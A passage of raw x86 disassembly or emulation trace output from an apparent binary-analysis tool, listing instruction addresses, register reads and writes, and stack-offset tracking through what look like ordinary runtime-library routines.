[30], regs_write: [30, 29] 0x457067: mov edi, edi, regs_read: [23], regs_write: [23] 0x457069: push ebx, regs_read: [30, 21], regs_write: [30] 0x45706a: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x45706c: push ecx, regs_read: [30, 22], regs_write: [30] 0x45706d: push ecx, regs_read: [30, 22], regs_write: [30] 0x457074: push ebp, regs_read: [30, 20], regs_write: [30] 0x457075: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x457078: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP -0x8 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x45707c: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x457084: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x45708b: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x45708e: mov eax, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [19] 0x457091: push esi, regs_read: [30, 29], regs_write: [30] 0x457092: mov esi, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [29] 0x457095: push edi, regs_read: [30, 23], regs_write: [30] 0x457099: mov dword ptr [ebp - 0x84], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x10 and offset 0x7f7c for stack size 0x10000 saving data to stack: 0 4 0x45709f: mov eax, dword ptr [esi], regs_read: [29], regs_write: [19] 0x4570c5: push 0x10, regs_read: [30], regs_write: [30] 0x4570c9: push 0x12, regs_read: [30], regs_write: [30] 0x4570cd: push 0x11, regs_read: [30], regs_write: [30] 0x4570d1: push 4, regs_read: [30], regs_write: [30] 0x4570d5: push 8, regs_read: [30], regs_write: [30] 0x4570d7: pop edi, regs_read: [30], regs_write: [30, 23] 0x4570d8: push ecx, regs_read: [30, 22], regs_write: [30] 0x4570dc: push eax, regs_read: [30, 19], regs_write: [30] 0x4570dd: push edi, regs_read: [30, 23], regs_write: [30] 0x4570ea: mov ecx, dword ptr [ebx + 8], regs_read: [21], regs_write: [22] 0x457102: mov eax, dword ptr [ebp - 0x40], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x2c and offset 0x7fc0 for stack size 0x10000 0x457111: mov dword ptr [ebp - 0x40], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x2c and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 4 0x457117: push eax, regs_read: [30, 19], regs_write: [30] 0x45711b: push eax, regs_read: [30, 19], regs_write: [30] 0x45711c: push ecx, regs_read: [30, 22], regs_write: [30] 0x45711d: push edi, regs_read: [30, 23], regs_write: [30] 0x457124: push eax, regs_read: [30, 19], regs_write: [30] 0x457128: push eax, regs_read: [30, 19], regs_write: [30] 0x457131: push 0xffff, regs_read: [30], regs_write: [30] 0x457136: push dword ptr [ebp - 0x84], regs_read: [30, 20], regs_write: [30] 0x457144: pop ecx, regs_read: [30], regs_write: [30, 22] 0x457145: pop ecx, regs_read: [30], regs_write: [30, 22] 0x457151: push esi, regs_read: [30, 29], regs_write: [30] 0x457157: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45715c: push dword ptr [esi], regs_read: [30, 29], regs_write: [30] 0x457163: pop ecx, regs_read: [30], regs_write: [30, 22] 0x457164: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x44 and offset 0x7ffc for stack size 0x10000 0x457167: pop edi, regs_read: [30], regs_write: [30, 23] 0x45716a: pop esi, regs_read: [30], regs_write: [30, 29] 0x457170: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x3c and offset 0x8000 for stack size 0x10000 0x457172: pop ebp, regs_read: [30], regs_write: [30, 20] 0x457173: mov esp, ebx, regs_read: [21], regs_write: [30] 0x457175: pop ebx, regs_read: [30], regs_write: [30, 21] 0x457177: mov edi, edi, regs_read: [23], regs_write: [23] 0x457179: push ebp, regs_read: [30, 20], regs_write: [30] 0x45717a: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x45717c: push ecx, regs_read: [30, 22], regs_write: [30] 0x45717d: push ecx, regs_read: [30, 22], regs_write: [30] 0x45718b: mov edi, edi, regs_read: [23], regs_write: [23] 0x45718d: push ebp, regs_read: [30, 20], regs_write: [30] 0x45718e: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x457190: mov eax, 0xffff, regs_read: (), regs_write: [19] 0x4571a2: push esi, regs_read: [30, 29], regs_write: [30] 0x4571a3: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x4571ae: mov ecx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x10 and offset 0x7ff0 for stack size 0x10000 0x4571b1: mov esi, 0x100, regs_read: (), regs_write: [29] 0x4571b6: mov ax, word ptr [ebp + 8], regs_read: [20], regs_write: [3] adjusting stack for ESP -0x10 and offset 0x8008 for stack size 0x10000 0x4571d8: mov eax, dword ptr [ecx + 0x94], regs_read: [22], regs_write: [19] 0x4571fe: mov eax, dword ptr [ecx + 0x94], regs_read: [22], regs_write: [19] 0x457220: push 1, regs_read: [30], regs_write: [30] 0x457225: push eax, regs_read: [30, 19], regs_write: [30] 0x457226: push 1, regs_read: [30], regs_write: [30] 0x45722b: push eax, regs_read: [30, 19], regs_write: [30] 0x45722c: push esi, regs_read: [30, 29], regs_write: [30] 0x45722d: push dword ptr [ecx + 0xa8], regs_read: [30, 22], regs_write: [30] 0x457250: pop esi, regs_read: [30], regs_write: [30, 29] 0x457253: mov ecx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x24 and offset 0x7fec for stack size 0x10000 0x457260: mov edi, edi, regs_read: [23], regs_write: [23] 0x457262: push ebp, regs_read: [30, 20], regs_write: [30] 0x457263: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x28 and offset 0x8000 for stack size 0x10000 0x45726b: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x457272: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x28 and offset 0x7ffc for stack size 0x10000 saving data to stack: 65535 4 0x457275: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x28 and offset 0x800c for stack size 0x10000 0x457278: push ebx, regs_read: [30, 21], regs_write: [30] 0x457279: mov ebx, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x2c and offset 0x8014 for stack size 0x10000 0x45727c: push esi, regs_read: [30, 29], regs_write: [30] 0x45727d: mov esi, dword ptr [ebp + 8], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x30 and offset 0x8008 for stack size 0x10000 0x457280: mov dword ptr [ebp - 0x104], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x30 and offset 0x7efc for stack size 0x10000 saving data to stack: 0 4 0x457286: mov dword ptr [ebp - 0x108], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x30 and offset 0x7ef8 for stack size 0x10000 saving data to stack: 0 4 0x45728c: push edi, regs_read: [30, 23], regs_write: [30] 0x45728d: mov edi, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x34 and offset 0x8010 for stack size 0x10000 0x457290: mov dword ptr [ebp - 0x100], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x34 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 4 0x4572a3: mov dword ptr [eax], 0x16, regs_read: [19], regs_write: () 0x4572ae: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x34 and offset 0x7ffc for stack size 0x10000 0x4572b1: pop edi, regs_read: [30], regs_write: [30, 23] 0x4572b2: pop esi, regs_read: [30], regs_write: [30, 29] 0x4572b5: pop ebx, regs_read: [30], regs_write: [30, 21] 0x4572bb: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x28 and offset 0x8000 for stack size 0x10000 0x4572bd: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4572c7: mov dword ptr [ebp - 0x118], 0, regs_read: [20], regs_write: () adjusting stack for ESP 0x4 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x4572dc: mov dword ptr [ebp - 0xf8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x4 and offset 0x7f08 for stack size 0x10000 saving data to stack: 0 4 0x4572e2: mov eax, ecx, regs_read: [22], regs_write: [19] 0x4572ff: mov dword ptr [ebp - 0x110], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x4 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 4 0x457305: mov eax, esi, regs_read: [29], regs_write: [19] 0x457307: mov esi, edx, regs_read: [24], regs_write: [29] 0x457309: mov dword ptr [ebp - 0xfc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x4 and offset 0x7f04 for stack size 0x10000 saving data to stack: 65535 4 0x457313: push eax, regs_read: [30, 19], regs_write: [30] 0x457314: push esi, regs_read: [30, 29], regs_write: [30] 0x457315: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x457326: mov eax, esi, regs_read: [29], regs_write: [19] 0x457328: mov dword ptr [ebp - 0xfc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x4 and offset 0x7f04 for stack size 0x10000 saving data to stack: 65535 4 0x457330: mov eax, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x4 and offset 0x7f04 for stack size 0x10000 0x457336: mov ecx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x4 and offset 0x7f08 for stack size 0x10000 0x457342: mov dword ptr [ebp - 0x10c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x4 and offset 0x7ef4 for stack size 0x10000 saving data to stack: 0 4 0x457348: mov edx, ecx, regs_read: [22], regs_write: [24] 0x457350: mov ebx, edi, regs_read: [23], regs_write: [21] 0x457352: mov dword ptr [ebp - 0xfc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x4 and offset 0x7f04 for stack size 0x10000 saving data to stack: 65535 4 0x457360: mov cl, byte ptr [eax + edx], regs_read: [19, 24], regs_write: [10] 0x457366: mov esi, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x4 and offset 0x7f04 for stack size 0x10000 0x45736c: mov al, byte ptr [edx - 1], regs_read: [24], regs_write: [2] 0x45736f: mov byte ptr [esi + edx - 1], al, regs_read: [29, 24, 2], regs_write: () 0x457373: mov eax, esi, regs_read: [29], regs_write: [19] 0x457375: mov byte ptr [edx - 1], cl, regs_read: [24, 10], regs_write: () 0x45737d: mov ebx, dword ptr [ebp - 0x108], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x7ef8 for stack size 0x10000 0x457383: mov ecx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x4 and offset 0x7f08 for stack size 0x10000 0x457389: mov esi, dword ptr [ebp - 0x104], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x4 and offset 0x7efc for stack size 0x10000 0x457391: mov edx, dword ptr [ebp - 0x110], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x4 and offset 0x7ef0 for stack size 0x10000 0x457397: mov dword ptr [ebp - 0xf8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x4 and offset 0x7f08 for stack size 0x10000 saving data to stack: 0 4 0x4573ac: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x4573b1: mov dword ptr [ebp - 0xfc], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x4 and offset 0x7f04 for stack size 0x10000 saving data to stack: 65535 4 0x4573ba: push edi, regs_read: [30, 23], regs_write: [30] 0x4573bb: push esi, regs_read: [30, 29], regs_write: [30] 0x4573bc: mov dword ptr [ebp - 0x114], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x4573ca: mov esi, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7f00 for stack size 0x10000 0x4573d5: mov eax, dword ptr [ebp - 0x104], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7efc for stack size 0x10000 0x4573dd: mov dword ptr [ebp - 0x10c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef4 for stack size 0x10000 saving data to stack: 0 4 0x4573e3: mov dword ptr [ebp - 0x110], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 4 0x4573ed: mov ebx, dword ptr [ebp - 0x10c], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x7ef4 for stack size 0x10000 0x4573f3: mov esi, edi, regs_read: [23], regs_write: [29] 0x4573f5: mov edi, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7f04 for stack size 0x10000 0x457400: mov al, byte ptr [esi], regs_read: [29], regs_write: [2] 0x457402: mov edx, esi, regs_read: [29], regs_write: [24] 0x457406: mov cl, byte ptr [edx], regs_read: [24], regs_write: [10] 0x457408: mov byte ptr [edx], al, regs_read: [24, 2], regs_write: () 0x45740a: mov byte ptr [esi], cl, regs_read: [29, 10], regs_write: () 0x457412: mov edi, dword ptr [ebp - 0x114], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7eec for stack size 0x10000 0x457418: mov ebx, dword ptr [ebp - 0x108], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x7ef8 for stack size 0x10000 0x45741e: mov esi, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7f00 for stack size 0x10000 0x457424: mov eax, dword ptr [ebp - 0x104], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7efc for stack size 0x10000 0x45742a: push dword ptr [ebp - 0xf8], regs_read: [30, 20], regs_write: [30] 0x457430: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x457432: push eax, regs_read: [30, 19], regs_write: [30] 0x45743b: mov edx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x14 and offset 0x7f08 for stack size 0x10000 0x457448: mov eax, dword ptr [ebp - 0x104], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x14 and offset 0x7efc for stack size 0x10000 0x45744e: mov dword ptr [ebp - 0x114], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x14 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x457454: mov esi, edx, regs_read: [24], regs_write: [29] 0x45745a: mov ebx, dword ptr [ebp - 0x114], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x14 and offset 0x7eec for stack size 0x10000 0x457462: mov dword ptr [ebp - 0x110], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x14 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 4 0x457468: mov edx, eax, regs_read: [19], regs_write: [24] 0x457470: mov al, byte ptr [esi], regs_read: [29], regs_write: [2] 0x457475: mov cl, byte ptr [edx + esi - 1], regs_read: [24, 29], regs_write: [10] 0x457479: mov byte ptr [edx + esi - 1], al, regs_read: [24, 29, 2], regs_write: () 0x45747d: mov byte ptr [esi - 1], cl, regs_read: [29, 10], regs_write: () 0x457485: mov ebx, dword ptr [ebp - 0x108], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x14 and offset 0x7ef8 for stack size 0x10000 0x45748b: mov edx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x14 and offset 0x7f08 for stack size 0x10000 0x457491: push edx, regs_read: [30, 24], regs_write: [30] 0x457492: push edi, regs_read: [30, 23], regs_write: [30] 0x457493: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x45749d: mov edx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x1c and offset 0x7f08 for stack size 0x10000 0x4574a8: mov eax, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f00 for stack size 0x10000 0x4574b0: mov ebx, eax, regs_read: [19], regs_write: [21] 0x4574b2: mov esi, edx, regs_read: [24], regs_write: [29] 0x4574b8: mov eax, edi, regs_read: [23], regs_write: [19] 0x4574bc: mov dword ptr [ebp - 0x114], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x4574c2: mov edx, eax, regs_read: [19], regs_write: [24] 0x4574c4: mov al, byte ptr [esi], regs_read: [29], regs_write: [2] 0x4574c9: mov cl, byte ptr [edx + esi - 1], regs_read: [24, 29], regs_write: [10] 0x4574cd: mov byte ptr [edx + esi - 1], al, regs_read: [24, 29, 2], regs_write: () 0x4574d1: mov byte ptr [esi - 1], cl, regs_read: [29, 10], regs_write: () 0x4574d9: mov eax, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f00 for stack size 0x10000 0x4574df: mov edx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x1c and offset 0x7f08 for stack size 0x10000 0x4574e5: mov esi, dword ptr [ebp - 0x104], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x1c and offset 0x7efc for stack size 0x10000 0x4574eb: mov ebx, edx, regs_read: [24], regs_write: [21] 0x4574ed: mov dword ptr [ebp - 0xfc], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x1c and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x457502: mov dword ptr [ebp - 0x10c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x1c and offset 0x7ef4 for stack size 0x10000 saving data to stack: 0 4 0x45750c: mov ecx, dword ptr [ebp - 0x108], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x7ef8 for stack size 0x10000 0x457512: push edi, regs_read: [30, 23], regs_write: [30] 0x457513: push esi, regs_read: [30, 29], regs_write: [30] 0x457525: mov eax, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x24 and offset 0x7f00 for stack size 0x10000 0x45752f: mov edx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x24 and offset 0x7f08 for stack size 0x10000 0x457535: mov ebx, dword ptr [ebp - 0x108], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x24 and offset 0x7ef8 for stack size 0x10000 0x457546: push edi, regs_read: [30, 23], regs_write: [30] 0x457547: push esi, regs_read: [30, 29], regs_write: [30] 0x457548: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x457552: mov edx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x2c and offset 0x7f08 for stack size 0x10000 0x45755d: mov eax, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x2c and offset 0x7f00 for stack size 0x10000 0x457565: mov ebx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x2c and offset 0x7f04 for stack size 0x10000 0x45756b: mov dword ptr [ebp - 0x10c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x2c and offset 0x7ef4 for stack size 0x10000 saving data to stack: 0 4 0x457571: mov esi, dword ptr [ebp - 0x108], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x2c and offset 0x7ef8 for stack size 0x10000 0x457580: mov eax, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x2c and offset 0x7f00 for stack size 0x10000 0x457586: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x45758a: mov dword ptr [ebp - 0xfc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x2c and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x457594: push edi, regs_read: [30, 23], regs_write: [30] 0x457595: push ebx, regs_read: [30, 21], regs_write: [30] 0x457596: mov ecx, esi, regs_read: [29], regs_write: [22] 0x4575a7: mov eax, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x34 and offset 0x7f00 for stack size 0x10000 0x4575ad: mov ecx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x34 and offset 0x7f04 for stack size 0x10000 0x4575b3: mov esi, dword ptr [ebp - 0x10c], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x34 and offset 0x7ef4 for stack size 0x10000 0x4575b9: mov dword ptr [ebp - 0xfc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x34 and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x4575c3: mov dword ptr [ebp - 0x110], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x34 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 4 0x4575c9: mov edx, ebx, regs_read: [21], regs_write: [24] 0x4575cf: mov ebx, eax, regs_read: [19], regs_write: [21] 0x4575d1: mov al, byte ptr [edx], regs_read: [24], regs_write: [2] 0x4575d6: mov cl, byte ptr [esi + edx - 1], regs_read: [29, 24], regs_write: [10] 0x4575da: mov byte ptr [esi + edx - 1], al, regs_read: [29, 24, 2], regs_write: () 0x4575de: mov byte ptr [edx - 1], cl, regs_read: [24, 10], regs_write: () 0x4575e6: mov esi, dword ptr [ebp - 0x10c], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x34 and offset 0x7ef4 for stack size 0x10000 0x4575ec: mov ebx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x34 and offset 0x7f04 for stack size 0x10000 0x4575f2: mov eax, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x34 and offset 0x7f00 for stack size 0x10000 0x4575f8: mov edx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x34 and offset 0x7f08 for stack size 0x10000 0x457606: mov edi, esi, regs_read: [29], regs_write: [23] 0x457611: mov ebx, dword ptr [ebp - 0x108], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x34 and offset 0x7ef8 for stack size 0x10000 0x457622: mov dword ptr [ebp - 0xfc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x34 and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x45762c: push edi, regs_read: [30, 23], regs_write: [30] 0x45762d: push ecx, regs_read: [30, 22], regs_write: [30] 0x45762e: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x457638: mov ecx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x3c and offset 0x7f04 for stack size 0x10000 0x457643: mov eax, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x3c and offset 0x7f00 for stack size 0x10000 0x45764d: mov ebx, dword ptr [ebp - 0x108], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x3c and offset 0x7ef8 for stack size 0x10000 0x457653: mov esi, dword ptr [ebp - 0x104], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x3c and offset 0x7efc for stack size 0x10000 0x457662: mov dword ptr [ebp - 0xfc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x3c and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x45766c: push edi, regs_read: [30, 23], regs_write: [30] 0x45766d: push ecx, regs_read: [30, 22], regs_write: [30] 0x45766e: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x457678: mov ecx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x44 and offset 0x7f04 for stack size 0x10000 0x457683: mov eax, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x44 and offset 0x7f00 for stack size 0x10000 0x45768b: mov esi, dword ptr [ebp - 0x10c], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x44 and offset 0x7ef4 for stack size 0x10000 0x457691: mov edx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x44 and offset 0x7f08 for stack size 0x10000 0x457697: mov ecx, edx, regs_read: [24], regs_write: [22] 0x457699: mov edi, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x44 and offset 0x7f04 for stack size 0x10000 0x4576a1: mov eax, edi, regs_read: [23], regs_write: [19] 0x4576ad: mov eax, dword ptr [ebp - 0x104], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x44 and offset 0x7efc for stack size 0x10000 0x4576b7: mov ecx, dword ptr [ebp - 0x118], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x44 and offset 0x7ee8 for stack size 0x10000 0x4576bd: mov dword ptr [ebp + ecx*4 - 0x7c], eax, regs_read: [20, 22, 19], regs_write: () 0x4576c1: mov dword ptr [ebp + ecx*4 - 0xf4], edi, regs_read: [20, 22, 23], regs_write: () 0x4576c9: mov dword ptr [ebp - 0x118], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x44 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x4576cf: mov ecx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x44 and offset 0x7f08 for stack size 0x10000 0x4576d5: mov edi, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x44 and offset 0x7f00 for stack size 0x10000 0x4576df: mov dword ptr [ebp - 0x104], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x44 and offset 0x7efc for stack size 0x10000 saving data to stack: 0 4 0x4576ee: mov eax, dword ptr [ebp - 0x118], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x44 and offset 0x7ee8 for stack size 0x10000 0x4576f4: mov dword ptr [ebp + eax*4 - 0x7c], esi, regs_read: [20, 19, 29], regs_write: () 0x4576f8: mov dword ptr [ebp + eax*4 - 0xf4], edx, regs_read: [20, 19, 24], regs_write: () 0x457700: mov dword ptr [ebp - 0x118], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x44 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x457706: mov esi, dword ptr [ebp - 0x104], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x44 and offset 0x7efc for stack size 0x10000 0x457710: mov ecx, edi, regs_read: [23], regs_write: [22] 0x457712: mov edi, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x44 and offset 0x7f00 for stack size 0x10000 0x45771d: mov edi, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x44 and offset 0x7f00 for stack size 0x10000 0x457723: mov eax, dword ptr [ebp - 0x118], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x44 and offset 0x7ee8 for stack size 0x10000 0x45772c: mov dword ptr [ebp - 0x118], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x44 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x457738: mov esi, dword ptr [ebp + eax*4 - 0x7c], regs_read: [20, 19], regs_write: [29] 0x45773c: mov ecx, dword ptr [ebp + eax*4 - 0xf4], regs_read: [20, 19], regs_write: [22] 0x457743: mov dword ptr [ebp - 0x104], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x44 and offset 0x7efc for stack size 0x10000 saving data to stack: 0 4 0x457750: push ebp, regs_read: [30, 20], regs_write: [30] 0x457751: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x48 and offset 0x8000 for stack size 0x10000 0x457753: push esi, regs_read: [30, 29], regs_write: [30] 0x457756: push eax, regs_read: [30, 19], regs_write: [30] 0x457757: push eax, regs_read: [30, 19], regs_write: [30] 0x457758: push eax, regs_read: [30, 19], regs_write: [30] 0x457759: push eax, regs_read: [30, 19], regs_write: [30] 0x45775a: push eax, regs_read: [30, 19], regs_write: [30] 0x45775b: push eax, regs_read: [30, 19], regs_write: [30] 0x45775c: push eax, regs_read: [30, 19], regs_write: [30] 0x45775d: push eax, regs_read: [30, 19], regs_write: [30] 0x45775e: mov edx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x6c and offset 0x800c for stack size 0x10000 0x457764: mov al, byte ptr [edx], regs_read: [24], regs_write: [2] 0x457773: mov esi, dword ptr [ebp + 8], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x6c and offset 0x8008 for stack size 0x10000 0x457776: mov edi, edi, regs_read: [23], regs_write: [23] 0x457778: mov al, byte ptr [esi], regs_read: [29], regs_write: [2] 0x45778d: pop esi, regs_read: [30], regs_write: [30, 29] 0x457790: mov edi, edi, regs_read: [23], regs_write: [23] 0x457792: push ebp, regs_read: [30, 20], regs_write: [30] 0x457793: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x6c and offset 0x8000 for stack size 0x10000 0x457795: push 0, regs_read: [30], regs_write: [30] 0x457797: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x45779a: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x4577a5: pop 